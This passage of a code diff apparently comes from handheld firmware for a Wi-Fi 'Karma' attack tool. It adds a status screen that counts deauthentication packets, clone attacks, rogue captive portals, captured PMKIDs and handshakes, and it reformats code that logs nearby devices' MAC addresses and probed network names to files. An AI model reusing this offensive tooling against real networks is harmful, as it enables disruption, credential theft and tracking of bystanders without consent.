+                     y += 15;
+                     tft.print("Clone Attacks: " + String(cloneAttacksLaunched));
+                     tft.setCursor(10, y);
+                     y += 15;
+                     tft.print("Deauth Packets: " + String(deauthPacketsSent));
+                     tft.setCursor(10, y);
+                     y += 15;
+                     int vulnCount = 0;
+                     for (const auto &clientPair : clientBehaviors)
+                         if (clientPair.second.isVulnerable) vulnCount++;
+                     tft.print("Vulnerable: " + String(vulnCount));
+                     tft.setCursor(10, y);
+                     y += 15;
+                     tft.print("Pending Attacks: " + String(pendingPortals.size()));
+                     tft.setCursor(10, y);
+                     y += 15;
+                     tft.print("Active Portals: " + String(activePortals.size()));
+                     tft.setCursor(10, y);
+                     y += 15;
+                     tft.print("PMKID Captured: " + String(pmkidCaptured));
+                     tft.setCursor(10, y);
+                     y += 15;
+                     tft.print("Handshakes: " + String(handshakeBuffer.size()));
+                     tft.setCursor(10, tftHeight - 20);
+                     tft.print("Sel: Back");
+                     while (!check(SelPress) && !check(EscPress)) {
+                         if (check(PrevPress)) break;
+                         delay(50);
+                     }
+                     screenNeedsRedraw = true;
+                 }},
+
+                {"Exit Karma", [&]() { returnToMenu = true; }                                     },
             };
-            
+
             loopOptions(options);
-            
+
             // Force full screen redraw after menu returns
             forceFullRedraw();
             drawMainBorderWithTitle("ENHANCED KARMA ATK");
@@ -2834,11 +3026,11 @@ void karma_setup() {
             if (templateSelected) padprintln("Template: " + selectedTemplate.name);
             else padprintln("Template: None");
             padprintln("SEL/ESC: Menu | Prev/Next: Channel");
-            
+
             screenNeedsRedraw = true;
             continue;
         }
-        
+
         updateKarmaDisplay();
         vTaskDelay(10 / portTICK_PERIOD_MS);
     }
@@ -2850,24 +3042,28 @@ void saveProbesToFile(FS &fs, bool compressed) {
     if (compressed) {
         File file = fs.open(filen, FILE_WRITE);
         if (file) {
-            file.write('K'); file.write('R'); file.write('M'); file.write(0x02);
+            file.write('K');
+            file.write('R');
+            file.write('M');
+            file.write(0x02);
             int count = bufferWrapped ? MAX_PROBE_BUFFER : probeBufferIndex;
             count = std::min(count, 100);
             uint16_t count16 = (uint16_t)count;
-            file.write((uint8_t*)&count16, 2);
+            file.write((uint8_t *)&count16, 2);
             for (int i = 0; i < count; i++) {
                 int idx = bufferWrapped ? (probeBufferIndex + i) % MAX_PROBE_BUFFER : i;
                 const ProbeRequest &probe = probeBuffer[idx];
                 if (probe.ssid.isEmpty() || probe.ssid == "*WILDCARD*") continue;
                 uint32_t timestamp = probe.timestamp;
-                file.write((uint8_t*)&timestamp, 4);
-                file.write((uint8_t*)probe.mac.c_str(), 17);
+                file.write((uint8_t *)&timestamp, 4);
+                file.write((uint8_t *)probe.mac.c_str(), 17);
                 int8_t rssi = (int8_t)probe.rssi;
-                file.write((uint8_t*)&rssi, 1);
-                file.write((uint8_t*)&probe.channel, 1);
+                file.write((uint8_t *)&rssi, 1);
+                file.write((uint8_t *)&probe.channel, 1);
                 uint8_t ssidLen = (uint8_t)probe.ssid.length();
                 file.write(&ssidLen, 1);
-                if (ssidLen > 0 && probe.ssid != "*HIDDEN*") file.write((uint8_t*)probe.ssid.c_str(), ssidLen);
+                if (ssidLen > 0 && probe.ssid != "*HIDDEN*")
+                    file.write((uint8_t *)probe.ssid.c_str(), ssidLen);
             }
             file.close();
         }
@@ -2881,11 +3077,18 @@ void saveProbesToFile(FS &fs, bool compressed) {
                 int idx = bufferWrapped ? (probeBufferIndex + i) % MAX_PROBE_BUFFER : i;
                 const ProbeRequest &probe = probeBuffer[idx];
                 if (probe.ssid.length() > 0 && probe.ssid != "*WILDCARD*") {
-                    file.printf("%lu,%s,%d,%d,\"%s\"\n", probe.timestamp, probe.mac.c_str(),
-                               probe.rssi, probe.channel, probe.ssid.c_str());
+                    file.printf(
+                        "%lu,%s,%d,%d,\"%s\"\n",
+                        probe.timestamp,
+                        probe.mac.c_str(),
+                        probe.rssi,
+                        probe.channel,
+                        probe.ssid.c_str()
+                    );
                 }
             }
             file.close();
         }
     }
 }
+#endif
